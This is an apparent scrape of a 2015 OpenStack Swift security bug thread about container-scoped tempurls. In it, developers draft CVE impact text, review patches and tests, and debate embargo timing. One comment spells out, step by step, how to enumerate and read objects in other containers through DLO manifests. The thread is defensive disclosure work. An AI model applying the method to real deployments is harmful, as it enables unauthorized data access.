Thanks Samuel! In that case, soliciting further comments on my original impact description from comment #26... is what's there correct? Any additional details we should include with the private CVE request?

Thanks Samuel! In that case, soliciting further comments on my original impact description from comment #26... is what's there correct? Any additional details we should include with the private CVE request?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-05: |  |  | [#31](/swift/%2Bbug/1449212/comments/31) |
| --- | --- | --- | --- |

You need more than one tempurl to actually retrieve objects. Maybe this?

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other container for the same Swift account (tenant) environment.

------

There are two related ways to exploit this:

The first way: given a tempurl for an object generated using a key on that object's container, one can PUT a manifest (i.e. object with X-Object-Manifest) to that URL, then HEAD the new object and, by observing the Etag and Content-Length contained within the HEAD response, learn whether an object starting with the given prefix exists.

For example, given two containers "red" and "blue" and a PUT tempurl for /v1/a/red/manifest, one can PUT /v1/a/red/manifest with header "X-Object-Manifest: /blue/abcd". A subsequent HEAD request for /v1/a/red/manifest will receive a response with an Etag and a Content-Length; the Etag is the MD5 hash of the Etags of all objects matching /v1/a/blue/abcd\*, and the Content-Length is the sum of their lengths. If the Etag is "d41d8cd98f00b204e9800998ecf8427e" (the MD5 of the empty string), then there are no objects whose names match /v1/a/blue/abcd\*. One can then overwrite the manifest with another that has a different X-Object-Manifest value, and in this way, can learn the names, lengths, and Etags of every object in container "blue".

The second way: given a tempurl \*key\* for a container, you can construct a PUT tempurl and a GET tempurl for the same object. Then, using the same procedure as above, discover the name of an object in the "blue" container. Then, PUT a manifest with "X-Object-Manifest: /blue/other-object-name", and finally, use the GET tempurl to download /v1/a/blue/other-object-name.

Both these exploits rely on large-object GET requests being able to examine segments outside the manifest's container even though the request was signed with a container-level tempurl key.

You need more than one tempurl to actually retrieve objects. Maybe this?
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other container for the same Swift account (tenant) environment.
------
There are two related ways to exploit this:
The first way: given a tempurl for an object generated using a key on that object's container, one can PUT a manifest (i.e. object with X-Object-Manifest) to that URL, then HEAD the new object and, by observing the Etag and Content-Length contained within the HEAD response, learn whether an object starting with the given prefix exists.
For example, given two containers "red" and "blue" and a PUT tempurl for /v1/a/red/manifest, one can PUT /v1/a/red/manifest with header "X-Object-Manifest: /blue/abcd". A subsequent HEAD request for /v1/a/red/manifest will receive a response with an Etag and a Content-Length; the Etag is the MD5 hash of the Etags of all objects matching /v1/a/blue/abcd\*, and the Content-Length is the sum of their lengths. If the Etag is "d41d8cd98f00b204e9800998ecf8427e" (the MD5 of the empty string), then there are no objects whose names match /v1/a/blue/abcd\*. One can then overwrite the manifest with another that has a different X-Object-Manifest value, and in this way, can learn the names, lengths, and Etags of every object in container "blue".
The second way: given a tempurl \*key\* for a container, you can construct a PUT tempurl and a GET tempurl for the same object. Then, using the same procedure as above, discover the name of an object in the "blue" container. Then, PUT a manifest with "X-Object-Manifest: /blue/other-object-name", and finally, use the GET tempurl to download /v1/a/blue/other-object-name.
Both these exploits rely on large-object GET requests being able to examine segments outside the manifest's container even though the request was signed with a container-level tempurl key.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-06: |  |  | [#32](/swift/%2Bbug/1449212/comments/32) |
| --- | --- | --- | --- |

Jeremy, Richard, Sam

Would anyone be against opening a separate security issue for the older "account level PUT temp-url allows probing for object existence via DLO's" issue?

I have a functest that will demonstrate the issue - we could try the remove headers trick and decide if that's how we want to address it - I don't think it will effect this patch except that it will only work with account-level temp-url keys once we approve this change.

Jeremy, Richard, Sam
Would anyone be against opening a separate security issue for the older "account level PUT temp-url allows probing for object existence via DLO's" issue?
I have a functest that will demonstrate the issue - we could try the remove headers trick and decide if that's how we want to address it - I don't think it will effect this patch except that it will only work with account-level temp-url keys once we approve this change.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-06: |  |  | [#33](/swift/%2Bbug/1449212/comments/33) |
| --- | --- | --- | --- |

Clay: I would not be against it. Being able to probe and possibly retrieve data, even if it is only with an account level temp URL, kinda scares me.

Clay: I would not be against it. Being able to probe and possibly retrieve data, even if it is only with an account level temp URL, kinda scares me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-06: |  |  | [#34](/swift/%2Bbug/1449212/comments/34) |
| --- | --- | --- | --- |

Samuel: Thanks for the additional details. As far as the CVE request goes, we simply need enough detail to reasonably differentiate this vulnerability from similar potential vulnerabilities which might be discovered in Swift over a relatively short period of time (say a year, as CVEs are year-scoped based on their discovery dates). For a deeper dive into more specific facets of the vulnerability the eventual security advisory will link to the bug and the patch(es) fixing it, so we don't need to get particularly verbose in the impact description as long as the risks and any \_commonly\_occurring\_ mitigating factors are mentioned.

Samuel: Thanks for the additional details. As far as the CVE request goes, we simply need enough detail to reasonably differentiate this vulnerability from similar potential vulnerabilities which might be discovered in Swift over a relatively short period of time (say a year, as CVEs are year-scoped based on their discovery dates). For a deeper dive into more specific facets of the vulnerability the eventual security advisory will link to the bug and the patch(es) fixing it, so we don't need to get particularly verbose in the impact description as long as the risks and any \_commonly\_occurring\_ mitigating factors are mentioned.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-06: |  |  | [#35](/swift/%2Bbug/1449212/comments/35) |
| --- | --- | --- | --- |

Clay: If we open an additional bug for a related issue, unless it's disclosed before or at the same time as this one, the publication of this bug will lay that one bare. We would either want a simultaneous publication/advisory/fix for both bugs, or we'd need to create two new bugs to separate the issues into and keep this original bug private until both new bugs have been disclosed.

Clay: If we open an additional bug for a related issue, unless it's disclosed before or at the same time as this one, the publication of this bug will lay that one bare. We would either want a simultaneous publication/advisory/fix for both bugs, or we'd need to create two new bugs to separate the issues into and keep this original bug private until both new bugs have been disclosed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-06: |  |  | [#36](/swift/%2Bbug/1449212/comments/36) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1449212/comments/36/%2Bdownload) (3.4 KiB)

Jeremy: OK, well I like the idea mainly because the dlo-manifest-with-put-temp-url-to-probe-other-containers issue will require back-ports to older releases while the container-temp-url-key scoping just needs to go back to kilo.

If we can co-ordinate the disclosure date for both it seems manageable. You said you're not against it right?

Unless someone beats me to it - or argues against it - I'll make a separate private security bug for the use dlo-manifest-with-put-temp-url-to-probe-other-containers issue and add my functional test that will describe the issue.

But I sorta wondering, if you can't PUT SLO manifests with tempurls (because of the questionable query-arg stripping) and we decide to strip DLO headers on PUT tempurls to address the account-tempurl issue - does the container scoping issue close itself - or are we still worried about a compromised app that has write access to a container and the ability to create pre-authed GET requests with a container-temp-url key creating a manifest they wouldn't normally authorize to cross-container read? Still seems like a reasonable vector to close with tempurl scoping...

Although we need to make sure we have good docs describing the limitations of container-tempurls and segmented objects - since I think we fully plan to support account-tempurls for manifests whose segments are in another container and we're explicitly deciding that if you have a valid cross-container SLO in a container and you try to create a container-tempurl for it - it doesn't work - on purpose.

FWIW, I think sam's swift.info patch is fine, the functests look good, I think sending a copy of the request with the swift.authorized popped into the app preserves existing behavior and expectations pretty well. I was worried about backports of the test fallout from that patch - but since we'd only backport it to Kilo I think it's fine - +2.

However, I still feel like it's conflating all of our grief with the get\_info caching and this security issue - which I'm sure we want to be as surgical of a fix as possible. I'm ok with going the route sam has suggested (+2), but still wondering if there might be something we like better for this fix... asides from the "don't pop authorize if it's a override authorize" trick I already suggested - another way to fake out the authorize pop would be to have the scoped authorized callbacks return an 403 unless the acls have been populated on the request so you make sure you're responding None to the delay denial callback and the not the early check. Or only pop authorized if swift.owner has been populated into the environment would work, since the whole pop trick is just an optimization anyway. OTOH, both of those are hacks, not modifying the request that was handed into the app seems like a reasonable and desireable behavior. Using a copy of the request to pull the authorize callback out of seems like a reasonable way to do that (don't modify the original request) but also still support the weird double auth check delay denial thing where we call authorize twice, ignore the denied response, but on None try to avoid calling authorize again after acl's have been fetched since the author...

[Read more...](/swift/%2Bbug/1449212/comments/36)

Jeremy: OK, well I like the idea mainly because the dlo-manifest-with-put-temp-url-to-probe-other-containers issue will require back-ports to older releases while the container-temp-url-key scoping just needs to go back to kilo.
If we can co-ordinate the disclosure date for both it seems manageable. You said you're not against it right?
Unless someone beats me to it - or argues against it - I'll make a separate private security bug for the use dlo-manifest-with-put-temp-url-to-probe-other-containers issue and add my functional test that will describe the issue.
But I sorta wondering, if you can't PUT SLO manifests with tempurls (because of the questionable query-arg stripping) and we decide to strip DLO headers on PUT tempurls to address the account-tempurl issue - does the container scoping issue close itself - or are we still worried about a compromised app that has write access to a container and the ability to create pre-authed GET requests with a container-temp-url key creating a manifest they wouldn't normally authorize to cross-container read? Still seems like a reasonable vector to close with tempurl scoping...
Although we need to make sure we have good docs describing the limitations of container-tempurls and segmented objects - since I think we fully plan to support account-tempurls for manifests whose segments are in another container and we're explicitly deciding that if you have a valid cross-container SLO in a container and you try to create a container-tempurl for it - it doesn't work - on purpose.
FWIW, I think sam's swift.info patch is fine, the functests look good, I think sending a copy of the request with the swift.authorized popped into the app preserves existing behavior and expectations pretty well. I was worried about backports of the test fallout from that patch - but since we'd only backport it to Kilo I think it's fine - +2.
However, I still feel like it's conflating all of our grief with the get\_info caching and this security issue - which I'm sure we want to be as surgical of a fix as possible. I'm ok with going the route sam has suggested (+2), but still wondering if there might be something we like better for this fix... asides from the "don't pop authorize if it's a override authorize" trick I already suggested - another way to fake out the authorize pop would be to have the scoped authorized callbacks return an 403 unless the acls have been populated on the request so you make sure you're responding None to the delay denial callback and the not the early check. Or only pop authorized if swift.owner has been populated into the environment would work, since the whole pop trick is just an optimization anyway. OTOH, both of those are hacks, not modifying the request that was handed into the app seems like a reasonable and desireable behavior. Using a copy of the request to pull the authorize callback out of seems like a reasonable way to do that (don't modify the original request) but also still support the weird double auth check delay denial thing where we call authorize twice, ignore the denied response, but on None try to avoid calling authorize again after acl's have been fetched since the authorize callback was already able to authorize the request without them originally. Has anyone else looked at sam's patch - did the commit message update help grok the swift.info cache trick which enables the use of the copied request instead of modifying the original? Does that look good to folks?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-10: |  |  | [#37](/swift/%2Bbug/1449212/comments/37) |
| --- | --- | --- | --- |

Sam: Sorry it took so long.

The only thing I found was really minor, and probably not worth holding back the patch since it's only a doc string and could be improved at a later time. So I will give my +1 for the patch, but maybe consider the following:

In swift/common/middleware/tempurl.py

I think the example return value for \_get\_keys was a little confusing due to missing ')' for \*-Key-2 examples.

~ 471 :returns: [

~ 472 (X-Account-Meta-Temp-URL-Key str value, ACCOUNT\_SCOPE) if set,

~ 473 (X-Account-Meta-Temp-URL-Key-2 str value, ACCOUNT\_SCOPE if set,

+ 474 (X-Container-Meta-Temp-URL-Key str value, CONTAINER\_SCOPE) if set,

+ 475 (X-Container-Meta-Temp-URL-Key-2 str value, CONTAINER\_SCOPE if set,

+ 476 ]

Something like the following might be a little clearer IMO:

~ 471 :returns: List of tuples for each key set. Where the tuple

~ 472 consists of the str value of \*-Meta-Temp-Url-Key and

~ 473 the scope of the key.

+ 474 Example: [

+ 475 (X-Account-Meta-Temp-URL-Key value, ACCOUNT\_SCOPE),

+ 476 (X-Account-Meta-Temp-URL-Key-2 value, ACCOUNT\_SCOPE),

+ 477 (X-Container-Meta-Temp-URL-Key value, CONTAINER\_SCOPE),

+ 478 (X-Container-Meta-Temp-URL-Key-2 value, CONTAINER\_SCOPE),

+ 479 ]

Sam: Sorry it took so long.
The only thing I found was really minor, and probably not worth holding back the patch since it's only a doc string and could be improved at a later time. So I will give my +1 for the patch, but maybe consider the following:
In swift/common/middleware/tempurl.py
I think the example return value for \_get\_keys was a little confusing due to missing ')' for \*-Key-2 examples.
~ 471 :returns: [
~ 472 (X-Account-Meta-Temp-URL-Key str value, ACCOUNT\_SCOPE) if set,
~ 473 (X-Account-Meta-Temp-URL-Key-2 str value, ACCOUNT\_SCOPE if set,
+ 474 (X-Container-Meta-Temp-URL-Key str value, CONTAINER\_SCOPE) if set,
+ 475 (X-Container-Meta-Temp-URL-Key-2 str value, CONTAINER\_SCOPE if set,
+ 476 ]
Something like the following might be a little clearer IMO:
~ 471 :returns: List of tuples for each key set. Where the tuple
~ 472 consists of the str value of \*-Meta-Temp-Url-Key and
~ 473 the scope of the key.
+ 474 Example: [
+ 475 (X-Account-Meta-Temp-URL-Key value, ACCOUNT\_SCOPE),
+ 476 (X-Account-Meta-Temp-URL-Key-2 value, ACCOUNT\_SCOPE),
+ 477 (X-Container-Meta-Temp-URL-Key value, CONTAINER\_SCOPE),
+ 478 (X-Container-Meta-Temp-URL-Key-2 value, CONTAINER\_SCOPE),
+ 479 ]

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-05-11

| Changed in ossa: | |
| --- | --- |
| **importance**: | Undecided → Medium |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-05-11: |  |  | [#38](/swift/%2Bbug/1449212/comments/38) |
| --- | --- | --- | --- |

Hi, so trying to understand the issue here:

A/ Since Kilo, container temp url allows probing and reading other containers' objects within the same account,

B/ Since at least Icehouse, account temp url allows probing and reading containers' objects within different accounts.

Correct me if I'm wrong, but the underlying issue seems identical (lack of check for temp url), and thus we better issue a single advisory (that could cover two bugs reports and different patch sets).

Some questions:

Comment #31 suggests the exploit needs more than one temp url. Is this for the account temp url issue ?

The current proposed fix in comment #25 only fix the container temp url and does not require a backport right ?

So what we are missing here to move forward is a fix for account temp url to be backported up to icehouse.

Hi, so trying to understand the issue here:
A/ Since Kilo, container temp url allows probing and reading other containers' objects within the same account,
B/ Since at least Icehouse, account temp url allows probing and reading containers' objects within different accounts.
Correct me if I'm wrong, but the underlying issue seems identical (lack of check for temp url), and thus we better issue a single advisory (that could cover two bugs reports and different patch sets).
Some questions:
Comment #31 suggests the exploit needs more than one temp url. Is this for the account temp url issue ?
The current proposed fix in comment #25 only fix the container temp url and does not require a backport right ?
So what we are missing here to move forward is a fix for account temp url to be backported up to icehouse.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-11: |  |  | [#39](/swift/%2Bbug/1449212/comments/39) |
| --- | --- | --- | --- |

Tristan: Thanks, I'm still similarly confused. Samuel's commit message on the attachment in comment #25 and reply in comment #29 indicate that account tempurls are not vulnerable, but Clay's and Richard's subsequent replies seem to contradict that.

Tristan: Thanks, I'm still similarly confused. Samuel's commit message on the attachment in comment #25 and reply in comment #29 indicate that account tempurls are not vulnerable, but Clay's and Richard's subsequent replies seem to contradict that.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-11: |  |  | [#40](/swift/%2Bbug/1449212/comments/40) |
| --- | --- | --- | --- |

Jeremy and Tristan,

As Richard has pointed out the we definitely need to backport a fix for PUT tempurls (which we don't yet have, but probably looks a lot like "break all clients who are trying to create DLO's via PUT tempurl").

I opened lp [bug #1453948](/bugs/1453948)

-Clay

Jeremy and Tristan,
As Richard has pointed out the we definitely need to backport a fix for PUT tempurls (which we don't yet have, but probably looks a lot like "break all clients who are trying to create DLO's via PUT tempurl").
I opened lp bug #1453948
-Clay

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-06-01: |  |  | [#41](/swift/%2Bbug/1449212/comments/41) |
| --- | --- | --- | --- |

Sam,

I think I've spotted a bug in your func tests.. but am about to step into a meeting. Once out I'll just double check to make sure and then post a follow up patch.

Sam,
I think I've spotted a bug in your func tests.. but am about to step into a meeting. Once out I'll just double check to make sure and then post a follow up patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-06-01: |  |  | [#42](/swift/%2Bbug/1449212/comments/42) |
| --- | --- | --- | --- |

* [Sam's patch with a fixed func test.](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4407820/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4407820)
  (82.7 KiB,
  text/plain)

Here is an updated version of Sam's patch, except with the test\_GET\_DLO\_outside\_container test fixed so the manifest is in container2 and points to the segments in container.

+ seg1 = self.env.container.file(

  + "get-dlo-outside-seg1" + Utils.create\_name())

  + seg2 = self.env.container.file(

  + "get-dlo-outside-seg2" + Utils.create\_name())

  + seg1.write("one fish two fish ")

  + seg2.write("red fish blue fish")

  +

  + container2 = self.env.account.container(Utils.create\_name())

  +

  + manifest = container2.file("manifest" + Utils.create\_name())

  + manifest.write(

  + '',

  + hdrs={"X-Object-Manifest": "%s/get-dlo-outside-seg" %

  + (self.env.container.name,)})

Here is an updated version of Sam's patch, except with the test\_GET\_DLO\_outside\_container test fixed so the manifest is in container2 and points to the segments in container.
+ seg1 = self.env.container.file(
+ "get-dlo-outside-seg1" + Utils.create\_name())
+ seg2 = self.env.container.file(
+ "get-dlo-outside-seg2" + Utils.create\_name())
+ seg1.write("one fish two fish ")
+ seg2.write("red fish blue fish")
+
+ container2 = self.env.account.container(Utils.create\_name())
+
+ manifest = container2.file("manifest" + Utils.create\_name())
+ manifest.write(
+ '',
+ hdrs={"X-Object-Manifest": "%s/get-dlo-outside-seg" %
+ (self.env.container.name,)})

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-10: |  |  | [#43](/swift/%2Bbug/1449212/comments/43) |
| --- | --- | --- | --- |

So what is the current proposed fix for this bug ?

Is the impact description proposed in comment #31 correct ?

Is there a plan for [bug 1453948](/bugs/1453948) ? Or will it be only fixed in master ?

So what is the current proposed fix for this bug ?
Is the impact description proposed in comment #31 correct ?
Is there a plan for bug 1453948 ? Or will it be only fixed in master ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-06-12: |  |  | [#44](/swift/%2Bbug/1449212/comments/44) |
| --- | --- | --- | --- |

@Tristan: Sams patch #25 with the change from Matthew in #42 looks good to me.

The impact description in comment #31 is correct, however the last but one paragraph is identical with [bug 1453948](/bugs/1453948) (and might be removed if two separate OSSAs are going to be published).

@Tristan: Sams patch #25 with the change from Matthew in #42 looks good to me.
The impact description in comment #31 is correct, however the last but one paragraph is identical with bug 1453948 (and might be removed if two separate OSSAs are going to be published).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-06-12: |  |  | [#45](/swift/%2Bbug/1449212/comments/45) |
| --- | --- | --- | --- |

The impact description in comment #31 is far, far too much detail. We need something around the brevity of my impact description in comment #26 to disambiguate this report from any similar bugs which might be reported within the same calendar year, and to act as a general signal to less technically savvy downstream consumers sufficiently answering the question "do I need to apply this patch on my systems?" Additional technical detail can be summarized within the bug if necessary.

The impact description in comment #31 is far, far too much detail. We need something around the brevity of my impact description in comment #26 to disambiguate this report from any similar bugs which might be reported within the same calendar year, and to act as a general signal to less technically savvy downstream consumers sufficiently answering the question "do I need to apply this patch on my systems?" Additional technical detail can be summarized within the bug if necessary.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-06-12: |  |  | [#46](/swift/%2Bbug/1449212/comments/46) |
| --- | --- | --- | --- |

Oh, I think I'm misreading comment #31 as implying that the paragraphs after the ---- should be part of the impact description. Sorry, the part above the ---- looks like a fine impact description to me too.

Oh, I think I'm misreading comment #31 as implying that the paragraphs after the ---- should be part of the impact description. Sorry, the part above the ---- looks like a fine impact description to me too.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#47](/swift/%2Bbug/1449212/comments/47) |
| --- | --- | --- | --- |

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1449212](https://bugs.launchpad.net/swift/%2Bbug/1449212) are closely related and should only be disclosed at the same time.

Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1449212 are closely related and should only be disclosed at the same time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#48](/swift/%2Bbug/1449212/comments/48) |
| --- | --- | --- | --- |

bad paste, sorry.

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) are closely related and should only be disclosed at the same time.

bad paste, sorry.
Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1453948 are closely related and should only be disclosed at the same time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-23: |  |  | [#49](/swift/%2Bbug/1449212/comments/49) |
| --- | --- | --- | --- |

I tried to rebase this on top of the fix I attached to lp [bug #1453948](/bugs/1453948) - but it looks like a couple of new tests assume it's safe to create DLO's via PUT tempurls (and then it validates you can't download them)

======================================================================

    ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurl)

    ----------------------------------------------------------------------

    Traceback (most recent call last):

      File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container

        (self.env.container.name,)})

      File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write

        self.conn.make\_path(self.path))

    ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/83790b246ebe49adb3240a9443a15789/manifestd6f808a66f82410aa73646327e8e9353') txid=tx91a6ef5b1001417eae414-005588c7ce

======================================================================

    ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurlUTF8)

    ----------------------------------------------------------------------

    Traceback (most recent call last):

      File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container

        (self.env.container.name,)})

      File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write

        self.conn.make\_path(self.path))

    ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/%E1%A0%83%E8%94%89%ED%88%8E%ED%88%8F%E3%9C%85%E8%94%8A%EF%84%91%E1%A0%82%E0%A4%82%E9%90%8B%E0%A4%81%E1%A0%81%E8%94%88%EF%84%8F%E8%94%88/manifest%EB%8C%8E%E0%A4%81%E5%98%88%E8%94%88%EB%8C%8C%E5%98%85%E5%98%88%E9%90%8C%E0%A4%82%EF%84%92%E5%98%85%EF%84%92%E1%A0%83%EF%84%90%E8%94%89') txid=tx3971d8beddea439badad0-005588c7cf

I tried to rebase this on top of the fix I attached to lp bug #1453948 - but it looks like a couple of new tests assume it's safe to create DLO's via PUT tempurls (and then it validates you can't download them)
======================================================================
ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurl)
----------------------------------------------------------------------
Traceback (most recent call last):
File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container
(self.env.container.name,)})
File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write
self.conn.make\_path(self.path))
ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/83790b246ebe49adb3240a9443a15789/manifestd6f808a66f82410aa73646327e8e9353') txid=tx91a6ef5b1001417eae414-005588c7ce
======================================================================
ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurlUTF8)
----------------------------------------------------------------------
Traceback (most recent call last):
File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container
(self.env.container.name,)})
File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write
self.conn.make\_path(self.path))
ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/%E1%A0%83%E8%94%89%ED%88%8E%ED%88%8F%E3%9C%85%E8%94%8A%EF%84%91%E1%A0%82%E0%A4%82%E9%90%8B%E0%A4%81%E1%A0%81%E8%94%88%EF%84%8F%E8%94%88/manifest%EB%8C%8E%E0%A4%81%E5%98%88%E8%94%88%EB%8C%8C%E5%98%85%E5%98%88%E9%90%8C%E0%A4%82%EF%84%92%E5%98%85%EF%84%92%E1%A0%83%EF%84%90%E8%94%89') txid=tx3971d8beddea439badad0-005588c7cf

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-29: |  |  | [#50](/swift/%2Bbug/1449212/comments/50) |
| --- | --- | --- | --- |

Adding ossg-coresec to both bugs in order to discuss if these bugs should be kept private.

Adding ossg-coresec to both bugs in order to discuss if these bugs should be kept private.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-29: |  |  | [#51](/swift/%2Bbug/1449212/comments/51) |
| --- | --- | --- | --- |

Why wouldn't they be kept private?

Can I get some feedback on the patch attached to lp [bug #1453948](/bugs/1453948)

If that looks good I can work on the rebase of sam & matts patch here over that - plus backports all around.

I think we should nail down the other fix first tho since it backports further.

Why wouldn't they be kept private?
Can I get some feedback on the patch attached to lp bug #1453948
If that looks good I can work on the rebase of sam & matts patch here over that - plus backports all around.
I think we should nail down the other fix first tho since it backports further.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-29: |  |  | [#52](/swift/%2Bbug/1449212/comments/52) |
| --- | --- | --- | --- |

Clay, having these bugs public would in theory get more reviewer on-board and a faster process (gerrit and gate testing).

It have been two months already and the exploitation of these issues seem to require a fair amount of social engineering, so unless there is something we missed, the impact is rather moderate.

Clay, having these bugs public would in theory get more reviewer on-board and a faster process (gerrit and gate testing).
It have been two months already and the exploitation of these issues seem to require a fair amount of social engineering, so unless there is something we missed, the impact is rather moderate.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Clark (robert-clark)](https://launchpad.net/~robert-clark) wrote on 2015-07-06: |  |  | [#53](/swift/%2Bbug/1449212/comments/53) |
| --- | --- | --- | --- |

Although moving slowly, the issue clearly has the attention of developers from Swift. I'm not convinced that opening this up would progress the issue any faster but it may put existing deployments at risk.

To that end, I suggest this remains closed.

@Swift Developers - what, if anything, can we (Security or VMT) do to help progress this?

Although moving slowly, the issue clearly has the attention of developers from Swift. I'm not convinced that opening this up would progress the issue any faster but it may put existing deployments at risk.
To that end, I suggest this remains closed.
@Swift Developers - what, if anything, can we (Security or VMT) do to help progress this?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-07-06: |  |  | [#54](/swift/%2Bbug/1449212/comments/54) |
| --- | --- | --- | --- |

I was more looking for feedback from vmt-coresec on whether this bug describes a viable, real-world exploit based on typical use cases, or whether it's a corner case relying on unusual trust boundaries and social engineering to achieve any actual compromise.

I'm mostly just trying to gauge relative severity since we're trying, within the VMT, to start pushing lower-severity vulnerability reports into the open. Keeping vulnerabilities under embargo for long periods of time is harmful both in terms of the amount of effort expended by parties involved (compared to availability of more efficient public-facing workflows), but also insofar as users of features impacted by this vulnerability don't currently know they should avoid doing so. The default stance of "keep every security vulnerability secret until it's fixed no matter how trivial" is a bad habit of which we're attempting to break ourselves going forward.

I was more looking for feedback from vmt-coresec on whether this bug describes a viable, real-world exploit based on typical use cases, or whether it's a corner case relying on unusual trust boundaries and social engineering to achieve any actual compromise.
I'm mostly just trying to gauge relative severity since we're trying, within the VMT, to start pushing lower-severity vulnerability reports into the open. Keeping vulnerabilities under embargo for long periods of time is harmful both in terms of the amount of effort expended by parties involved (compared to availability of more efficient public-facing workflows), but also insofar as users of features impacted by this vulnerability don't currently know they should avoid doing so. The default stance of "keep every security vulnerability secret until it's fixed no matter how trivial" is a bad habit of which we're attempting to break ourselves going forward.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-07-06: |  |  | [#55](/swift/%2Bbug/1449212/comments/55) |
| --- | --- | --- | --- |

Sorry, I meant "ossg-coresec" where I said "vmt-coresec" there.

Sorry, I meant "ossg-coresec" where I said "vmt-coresec" there.

[John Dickinson (notmyname)](https://launchpad.net/~notmyname)
on 2015-07-29

| Changed in swift: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
